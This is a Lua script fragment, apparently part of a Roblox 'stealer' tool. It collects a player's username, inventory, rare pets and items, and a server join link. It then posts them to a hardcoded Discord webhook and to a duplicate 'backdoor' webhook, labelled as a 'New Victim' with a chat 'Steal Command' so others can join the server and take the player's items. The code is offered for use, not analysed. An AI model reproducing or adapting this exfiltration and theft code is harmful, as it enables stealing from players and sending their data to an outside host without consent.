local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

local function sendToWebhook()
    if not LocalPlayer then return end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local messageData = {
        content = "L hit bru nothing good",
        embeds = {{
            title = "🎯 New Victim Found!",
            description = "READ #⚠️information in Aurora scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
            color = 0x530000,
            fields = {
                {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                {name = "🔗 Join Link", value = joinLink, inline = true},
                {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = HttpService:JSONEncode(messageData)
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
    request({
        Url = backdoorWebhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })

    if #inventory.rarePets > 0 then
        local rarePetMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pet Found!",
                description = "A rare pet has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = joinLink, inline = true},
                    {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        local petJson = HttpService:JSONEncode(rarePetMessage)
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = petJson
        })
        request({
            Url = backdoorWebhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = petJson
        })
    end

    if #inventory.rareItems > 0 then
        local rareItemMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🌟 Rare Item Found!",
                description = "A rare item has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = joinLink, inline = true},
                    {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        local itemJson = HttpService:JSONEncode(rareItemMessage)
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = itemJson
        })
        request({
            Url = backdoorWebhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = itemJson
        })
    end
enda
